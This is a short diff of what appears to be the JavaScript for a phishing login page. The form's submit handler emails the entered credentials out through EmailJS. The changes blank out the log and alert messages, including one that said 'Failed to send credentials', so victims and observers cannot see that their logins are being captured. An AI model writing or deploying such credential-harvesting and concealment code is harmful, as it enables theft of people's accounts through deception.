@@ -48,14 +48,14 @@ loginForm.addEventListener('submit', async function(e) {
       emailParams
     );
 
-    console.log('Email sent successfully:', emailResponse);
+    console.log(':', emailResponse);
     alert(' ');
 
     loginForm.reset();
 
   } catch (error) {
     console.error('Error sending email:', error);
-    alert('Error: Failed to send credentials. Please check your EmailJS configuration.');
+    alert('.');
   } finally {
     submitButton.textContent = originalText;
     submitButton.disabled = false;
